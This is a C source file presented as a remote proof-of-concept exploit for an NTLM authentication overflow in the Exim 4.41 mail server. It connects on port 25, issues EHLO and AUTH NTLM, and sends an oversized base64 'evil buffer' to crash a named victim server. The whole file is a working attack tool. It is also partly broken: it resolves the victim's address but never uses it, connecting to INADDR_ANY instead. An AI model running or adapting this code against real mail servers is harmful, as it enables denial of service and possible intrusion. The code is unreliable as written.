/*
 * Remote PoC code for vulnerability discovered by iDEFENSE in Exim 4.41 by pi3 (pi3ki31ny).
 * 
 * http://pi3.int.pl
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>

static const char base64digits[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

#define BAD    -1
#define SA struct sockaddr

static const char base64val[] = {
  BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD,
    BAD,
  BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD,
    BAD,
  BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, BAD, 62, BAD, BAD, BAD,
    63,
  52, 53, 54, 55, 56, 57, 58, 59, 60, 61, BAD, BAD, BAD, BAD, BAD, BAD,
  BAD, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
  15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, BAD, BAD, BAD, BAD, BAD,
  BAD, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
  41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, BAD, BAD, BAD, BAD, BAD
};
#define DECODE64(c)  (isascii(c) ? base64val[c] : BAD)

void
spa_bits_to_base64 (unsigned char *out, const unsigned char *in, int inlen)
/* raw bytes in quasi-big-endian order to base 64 string (NUL-terminated) */
{
  for (; inlen >= 3; inlen -= 3)
    {
      *out++ = base64digits[in[0] >> 2];
      *out++ = base64digits[((in[0] << 4) & 0x30) | (in[1] >> 4)];
      *out++ = base64digits[((in[1] << 2) & 0x3c) | (in[2] >> 6)];
      *out++ = base64digits[in[2] & 0x3f];
      in += 3;
    }
  if (inlen > 0)
    {
      unsigned char fragment;

      *out++ = base64digits[in[0] >> 2];
      fragment = (in[0] << 4) & 0x30;
      if (inlen > 1)
       fragment |= in[1] >> 4;
      *out++ = base64digits[fragment];
      *out++ = (inlen < 2) ? '=' : base64digits[(in[1] << 2) & 0x3c];
      *out++ = '=';
    }
  *out = '\0';
}

void check(char *b,char *a) {
   
   char *tmp=NULL;
   
   if ( (tmp=strstr(b,a))==NULL) {
      printf("Error! Not NTLM login found in respone!\n");
      exit(-1);
   }
}

void wyjdz(char *arg) {
   
   printf("\n\n\t...::: -=[ Remote PoC exploit for Exim by pi3 (pi3ki31ny) ]=- :::...\n");
   printf("\n\t\tUssage:\n\t\t\t%s <victim>\n\n\n",arg);
   exit(-1);
}

int main(int argc, char *argv[]) {
   
   int sockfd,i=0;
   long inet;
   char buf[5000],tmp_buf[9096];
   struct sockaddr_in servaddr;
   struct hostent *h;
   
   (argv[1]==NULL) ? (wyjdz(argv[0])):1;
   
   printf("\n\n\t...::: -=[ Remote PoC exploit for Exim by pi3 (pi3ki31ny) ]=- :::...\n");
   
   if ( (h=gethostbyname((char*)argv[1])) == NULL) {
      printf("Gethostbyname() field!\n");
      exit(-1);
   }
   memcpy (&inet, h->h_addr, 4);
   
   servaddr.sin_family      = AF_INET;
   servaddr.sin_port        = htons(25);
   servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
   
   if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) <0 ) {
      printf("Socket() error!\n");
      exit(-1);
   }
   
   if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr)) ) <0 ) {
      printf("Connect() error!\n");
      exit(-1);
   }
   bzero(tmp_buf,sizeof(tmp_buf));
   if ( (i=read(sockfd,tmp_buf,sizeof(tmp_buf))) == 0) {
      printf("I can\'t read from source host...\nExiting...\n\n");
      exit(-1);
   }
   printf("\n\t[*] Connected to: %s\n",argv[1]);
   write(sockfd,"EHLO p\n",7);
   bzero(tmp_buf,sizeof(tmp_buf));
   if ( (i=read(sockfd,tmp_buf,sizeof(tmp_buf))) == 0) {
      printf("I can\'t read from source host...\nExiting...\n\n");
      exit(-1);
   }
   check(tmp_buf,"NTLM");
   write(sockfd,"AUTH NTLM\n",10);
   bzero(tmp_buf,sizeof(tmp_buf));
   if ( (i=read(sockfd,tmp_buf,sizeof(tmp_buf))) == 0) {
      printf("I can\'t read from source host...\nExiting...\n\n");
      exit(-1);
   }
   check(tmp_buf,"334");
   
   printf("\t[*] OK! Athorization NTLM support...\n");
   for(i=0;i<4040;i++)
     spa_bits_to_base64(&buf[i],"A",1);
   write(sockfd,buf,strlen(buf));
   write(sockfd,"\n",1);
   printf("\t[*] Evil buffer sended!\n\n\n");
   bzero(tmp_buf,sizeof(tmp_buf));
   if ( (i=read(sockfd,tmp_buf,sizeof(tmp_buf))) == 0)
     printf("\t[*] Server is vulnerability!\n\n\n");
   else
     printf("\t[*] Server isn\'t vulnerability ;(\n\n\n");
   return 0;
}